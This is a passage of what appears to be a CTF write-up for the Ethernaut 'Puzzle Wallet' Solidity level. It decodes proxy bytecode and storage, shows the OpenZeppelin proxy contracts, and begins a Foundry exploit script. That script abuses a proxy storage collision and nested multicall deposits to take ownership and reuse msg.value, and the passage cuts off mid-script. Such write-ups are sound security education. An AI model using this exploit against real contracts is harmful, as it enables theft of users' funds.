class=\"mi\">32</span><span class=\"p\">))</span>            <span class=\"p\">}</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">selector</span> <span class=\"o\">==</span> <span class=\"nb\">this</span><span class=\"p\">.</span><span class=\"n\">deposit</span><span class=\"p\">.</span><span class=\"nb\">selector</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">depositCalled</span><span class=\"p\">,</span> <span class=\"s\">\"Deposit can only be called once\"</span><span class=\"p\">);</span>                <span class=\"c1\">// Protect against reusing msg.value</span>                <span class=\"n\">depositCalled</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">success</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]);</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">success</span><span class=\"p\">,</span> <span class=\"s\">\"Error while delegating call\"</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When searching for the given instance address on Etherscan,</p><p><img src=\"https://0o3q.github.io/images/2026-01-09-Puzzle_Wallet/etherscan.png\" alt=\"Image etherscan\" /></p><p>we can obtain the following result, and when looking at the instance address ‘<strong>0x3B4dF0D5…c938Bfcf7</strong>’,</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"mh\">0x608060405234801561001057600080fd5b5060405161080238038061080283398101604081905261002f91610229565b818161005c60017f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd6102f9565b6000805160206107e2833981519152146100785761007861031e565b6100818261011d565b8051156100f2576000826001600160a01b0316826040516100a29190610334565b600060405180830381855af49150503d80600081146100dd576040519150601f19603f3d011682016040523d82523d6000602084013e6100e2565b606091505b50509050806100f057600080fd5b505b5050600180546001600160a01b0319166001600160a01b039490941693909317909255506103509050565b610130816101b860201b6103091760201c565b6101a65760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e747261637400000000000000000000606482015260840160405180910390fd5b6000805160206107e283398151915255565b6001600160a01b03163b151590565b80516001600160a01b03811681146101de57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156102145781810151838201526020016101fc565b83811115610223576000848401525b50505050565b60008060006060848603121561023e57600080fd5b610247846101c7565b9250610255602085016101c7565b60408501519092506001600160401b038082111561027257600080fd5b818601915086601f83011261028657600080fd5b815181811115610298576102986101e3565b604051601f8201601f19908116603f011681019083821181831017156102c0576102c06101e3565b816040528281528960208487010111156102d957600080fd5b6102ea8360208301602088016101f9565b80955050505050509250925092565b60008282101561031957634e487b7160e01b600052601160045260246000fd5b500390565b634e487b7160e01b600052600160045260246000fd5b600082516103468184602087016101f9565b9190910192915050565b6104838061035f6000396000f3fe60806040526004361061005e5760003560e01c8063a02fcc0a11610043578063a02fcc0a146100d1578063a6376746146100f1578063f851a4401461013b5761006d565b806326782247146100755780633659cfe6146100b15761006d565b3661006d5761006b61015b565b005b61006b61015b565b34801561008157600080fd5b50600054610095906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100bd57600080fd5b5061006b6100cc36600461041d565b61018d565b3480156100dd57600080fd5b5061006b6100ec36600461041d565b6101f8565b3480156100fd57600080fd5b5061006b61010c36600461041d565b6000805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b0392909216919091179055565b34801561014757600080fd5b50600154610095906001600160a01b031681565b61018b6101867f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5490565b610318565b565b6001546001600160a01b031633146101ec5760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064015b60405180910390fd5b6101f58161033c565b50565b6001546001600160a01b031633146102525760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064016101e3565b6000546001600160a01b038281169116146102d7576040805162461bcd60e51b81526020600482015260248101919091527f4578706563746564206e65772061646d696e206279207468652063757272656e60448201527f742061646d696e206973206e6f74207468652070656e64696e672061646d696e60648201526084016101e3565b506000546001805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b03909216919091179055565b6001600160a01b03163b151590565b3660008037600080366000845af43d6000803e808015610337573d6000f35b3d6000fd5b6103458161037c565b6040516001600160a01b038216907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b90600090a250565b6001600160a01b0381163b6103f95760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e74726163740000000000000000000060648201526084016101e3565b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc55565b60006020828403121561042f57600080fd5b81356001600160a01b038116811461044657600080fd5b939250505056fea264697066735822122019f5b597827a464b3dc9c8297579a2f42ecc3c05c39a711bc728b4426bdb12c264736f6c634300080c0033360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000</span></code></pre></div></div><p>We can observe that the Implementation Slot address defined in the EIP-1967 standard, <code class=\"language-plaintext highlighter-rouge\">bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1)</code> ⇒ <code class=\"language-plaintext highlighter-rouge\">360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>, follows <code class=\"language-plaintext highlighter-rouge\">736f6c634300080c0033</code>, which <a href=\"https://docs.soliditylang.org/en/latest/metadata.html\">represents the <code class=\"language-plaintext highlighter-rouge\">solc</code> version and metadata length</a>. Afterward, you can confirm that the constructor arguments follow.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">$</span> <span class=\"n\">cast</span> <span class=\"n\">decode</span><span class=\"o\">-</span><span class=\"n\">abi</span> <span class=\"o\">--</span><span class=\"n\">input</span> <span class=\"s\">\"constructor(address,address,bytes)()\"</span> <span class=\"mh\">0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000</span><span class=\"mh\">0x725595BA16E76ED1F6cC1e1b65A88365cC494824</span><span class=\"mh\">0xCbE7D493E8aa233Cd2AF845C158bEab5fA723B84</span><span class=\"mh\">0xb7b0422d0000000000000000000000000000000000000000000000056bc75e2d63100000</span></code></pre></div></div><p>When directly inspecting the storage of the PuzzleProxy contract, we can see that the <code class=\"language-plaintext highlighter-rouge\">admin</code> value set in the <code class=\"language-plaintext highlighter-rouge\">constructor</code> is <code class=\"language-plaintext highlighter-rouge\">0x725595BA16E76ED1F6cC1e1b65A88365cC494824</code>(Level address).</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">$</span> <span class=\"n\">cast</span> <span class=\"k\">storage</span> <span class=\"mh\">0x3b4df0d50d91dce6995d60869e9b886c938bfcf7</span> <span class=\"mi\">1</span> <span class=\"o\">--</span><span class=\"n\">rpc</span><span class=\"o\">-</span><span class=\"n\">url</span> <span class=\"n\">sepoli</span><span class=\"n\">a</span><span class=\"mh\">0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824</span></code></pre></div></div><p>Thus, we confirmed that the code of the given instance address is the PuzzleProxy contract.</p><p><strong>The key features of the PuzzleProxy contract:</strong></p><ul>  <li>The <code class=\"language-plaintext highlighter-rouge\">proposeNewAdmin()</code> function changes <code class=\"language-plaintext highlighter-rouge\">pendingAdmin</code>.</li>  <li>The <code class=\"language-plaintext highlighter-rouge\">approveNewAdmin()</code> function changes <code class=\"language-plaintext highlighter-rouge\">admin</code> (when <code class=\"language-plaintext highlighter-rouge\">onlyAdmin</code>).</li></ul><p><strong>The key features of the PuzzleWallet contract:</strong></p><ul>  <li>The <code class=\"language-plaintext highlighter-rouge\">setMaxBalance()</code> function changes <code class=\"language-plaintext highlighter-rouge\">maxBalance</code> (when <code class=\"language-plaintext highlighter-rouge\">onlyWhitelisted</code>).</li>  <li>The <code class=\"language-plaintext highlighter-rouge\">addToWhitelist()</code> function changes <code class=\"language-plaintext highlighter-rouge\">whitelisted[addr]</code> to <code class=\"language-plaintext highlighter-rouge\">true</code>.</li>  <li>The <code class=\"language-plaintext highlighter-rouge\">deposit()</code> function adds <code class=\"language-plaintext highlighter-rouge\">msg.value</code> to <code class=\"language-plaintext highlighter-rouge\">balances[msg.sender]</code> (when <code class=\"language-plaintext highlighter-rouge\">onlyWhitelisted</code>).</li>  <li>The <code class=\"language-plaintext highlighter-rouge\">execute()</code> function performs a call (when <code class=\"language-plaintext highlighter-rouge\">onlyWhitelisted</code>).</li>  <li>The <code class=\"language-plaintext highlighter-rouge\">multicall()</code> function performs multiple calls, excluding <code class=\"language-plaintext highlighter-rouge\">deposit()</code> (when <code class=\"language-plaintext highlighter-rouge\">onlyWhitelisted</code>).</li></ul><h3 id=\"upgradeableproxy-08\">UpgradeableProxy-08</h3><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/proxy/Proxy.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/utils/Address.sol\"</span><span class=\"p\">;</span><span class=\"cm\">/** * * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an * implementation address that can be changed. This address is stored in storage in the location specified by * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the * implementation behind the proxy. * * Upgradeability is only provided internally through {_upgradeTo}. For an externally upgradeable proxy see * {TransparentUpgradeableProxy}. */</span><span class=\"k\">contract</span> <span class=\"n\">UpgradeableProxy</span> <span class=\"k\">is</span> <span class=\"n\">Proxy</span> <span class=\"p\">{</span>    <span class=\"cm\">/**     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.     *     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded     * function call, and allows initializating the storage of the proxy like a Solidity constructor.     */</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_logic</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">_data</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">assert</span><span class=\"p\">(</span><span class=\"n\">_IMPLEMENTATION_SLOT</span> <span class=\"o\">==</span> <span class=\"kt\">bytes32</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"s\">\"eip1967.proxy.implementation\"</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"n\">_setImplementation</span><span class=\"p\">(</span><span class=\"n\">_logic</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">_data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"c1\">// solhint-disable-next-line avoid-low-level-calls</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">success</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">_logic</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">_data</span><span class=\"p\">);</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">success</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Emitted when the implementation is upgraded.     */</span>    <span class=\"k\">event</span> <span class=\"n\">Upgraded</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">indexed</span> <span class=\"n\">implementation</span><span class=\"p\">);</span>    <span class=\"cm\">/**     * @dev Storage slot with the address of the current implementation.     * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is     * validated in the constructor.     */</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">private</span> <span class=\"k\">constant</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span> <span class=\"o\">=</span> <span class=\"mh\">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class=\"p\">;</span>    <span class=\"cm\">/**     * @dev Returns the current implementation address.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_implementation</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"k\">view</span> <span class=\"k\">override</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">impl</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">bytes32</span> <span class=\"n\">slot</span> <span class=\"o\">=</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span><span class=\"p\">;</span>        <span class=\"c1\">// solhint-disable-next-line no-inline-assembly</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">impl</span> <span class=\"o\">:=</span> <span class=\"n\">sload</span><span class=\"p\">(</span><span class=\"n\">slot</span><span class=\"p\">)</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Upgrades the proxy to a new implementation.     *     * Emits an {Upgraded} event.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_upgradeTo</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"n\">_setImplementation</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">);</span>        <span class=\"k\">emit</span> <span class=\"n\">Upgraded</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Stores a new address in the EIP1967 implementation slot.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_setImplementation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">)</span> <span class=\"k\">private</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">Address</span><span class=\"p\">.</span><span class=\"n\">isContract</span><span class=\"p\">(</span><span class=\"n\">newImplementation</span><span class=\"p\">),</span> <span class=\"s\">\"UpgradeableProxy: new implementation is not a contract\"</span><span class=\"p\">);</span>        <span class=\"kt\">bytes32</span> <span class=\"n\">slot</span> <span class=\"o\">=</span> <span class=\"n\">_IMPLEMENTATION_SLOT</span><span class=\"p\">;</span>        <span class=\"c1\">// solhint-disable-next-line no-inline-assembly</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">sstore</span><span class=\"p\">(</span><span class=\"n\">slot</span><span class=\"p\">,</span> <span class=\"n\">newImplementation</span><span class=\"p\">)</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In the inherited UpgradeableProxy contract, you can see that the <code class=\"language-plaintext highlighter-rouge\">_setImplementation</code> function stores <code class=\"language-plaintext highlighter-rouge\">_logic</code> in the <code class=\"language-plaintext highlighter-rouge\">_IMPLEMENTATION_SLOT</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">_logic</code> is the second argument of the <code class=\"language-plaintext highlighter-rouge\">PuzzleProxy</code> constructor (<code class=\"language-plaintext highlighter-rouge\">0xCbE7D493E8aa233Cd2AF845C158bEab5fA723B84</code>), and as seen earlier on Etherscan, this address is identified as the PuzzleWallet address.</p><h3 id=\"proxy\">Proxy</h3><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (proxy/Proxy.sol)</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"cm\">/** * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to * be specified by overriding the virtual {_implementation} function. * * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a * different contract through the {_delegate} function. * * The success and return data of the delegated call will be returned back to the caller of the proxy. */</span><span class=\"k\">abstract</span> <span class=\"k\">contract</span> <span class=\"n\">Proxy</span> <span class=\"p\">{</span>    <span class=\"cm\">/**     * @dev Delegates the current call to `implementation`.     *     * This function does not return to its internal call site, it will return directly to the external caller.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_delegate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">implementation</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"c1\">// Copy msg.data. We take full control of memory in this inline assembly</span>            <span class=\"c1\">// block because it will not return to Solidity code. We overwrite the</span>            <span class=\"c1\">// Solidity scratch pad at memory position 0.</span>            <span class=\"n\">calldatacopy</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">calldatasize</span><span class=\"p\">())</span>            <span class=\"c1\">// Call the implementation.</span>            <span class=\"c1\">// out and outsize are 0 because we don't know the size yet.</span>            <span class=\"kr\">let</span> <span class=\"n\">result</span> <span class=\"o\">:=</span> <span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">gas</span><span class=\"p\">(),</span> <span class=\"n\">implementation</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">calldatasize</span><span class=\"p\">(),</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">)</span>            <span class=\"c1\">// Copy the returned data.</span>            <span class=\"n\">returndatacopy</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span>            <span class=\"kr\">switch</span> <span class=\"n\">result</span>            <span class=\"c1\">// delegatecall returns 0 on error.</span>            <span class=\"kr\">case</span> <span class=\"mi\">0</span> <span class=\"p\">{</span>                <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span>            <span class=\"p\">}</span>            <span class=\"kr\">default</span> <span class=\"p\">{</span>                <span class=\"k\">return</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">returndatasize</span><span class=\"p\">())</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function     * and {_fallback} should delegate.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_implementation</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"k\">view</span> <span class=\"k\">virtual</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"cm\">/**     * @dev Delegates the current call to the address returned by `_implementation()`.     *     * This function does not return to its internal call site, it will return directly to the external caller.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_fallback</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"n\">_beforeFallback</span><span class=\"p\">();</span>        <span class=\"n\">_delegate</span><span class=\"p\">(</span><span class=\"n\">_implementation</span><span class=\"p\">());</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other     * function in the contract matches the call data.     */</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"n\">_fallback</span><span class=\"p\">();</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data     * is empty.     */</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>        <span class=\"n\">_fallback</span><span class=\"p\">();</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`     * call, or as part of the Solidity `fallback` or `receive` functions.     *     * If overridden should call `super._beforeFallback()`.     */</span>    <span class=\"k\">function</span> <span class=\"n\">_beforeFallback</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{}</span><span class=\"p\">}</span></code></pre></div></div><p>In the inherited Proxy contract, we can see a Proxy structure where the <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code> function is executed within the <code class=\"language-plaintext highlighter-rouge\">fallback()</code> function.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/PuzzleWallet.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">PuzzleWalletSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">PuzzleProxy</span> <span class=\"k\">public</span> <span class=\"n\">pp_</span> <span class=\"o\">=</span> <span class=\"n\">PuzzleProxy</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7</span><span class=\"p\">));</span>    <span class=\"n\">PuzzleWallet</span> <span class=\"k\">public</span> <span class=\"n\">pw_</span> <span class=\"o\">=</span> <span class=\"n\">PuzzleWallet</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before pendingAdmin:   \"</span><span class=\"p\">,</span> <span class=\"n\">pp_</span><span class=\"p\">.</span><span class=\"n\">pendingAdmin</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before owner:          \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">pp_</span><span class=\"p\">.</span><span class=\"n\">proposeNewAdmin</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected proposeNewAdmin\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After  pendingAdmin:   \"</span><span class=\"p\">,</span> <span class=\"n\">pp_</span><span class=\"p\">.</span><span class=\"n\">pendingAdmin</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After  owner:          \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>                <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"====================\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before whitelisted:    \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">whitelisted</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">addToWhitelist</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected addToWhitelist\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After  whitelisted:    \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">whitelisted</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"====================\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before balance:       \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before user balance:  \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">deposit</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected deposit\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After balance:        \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After user balance:   \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"====================\"</span><span class=\"p\">);</span>        <span class=\"kt\">bytes</span><span class=\"p\">[]</span> <span class=\"k\">memory</span> <span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">data0</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"deposit()\"</span><span class=\"p\">);</span>        <span 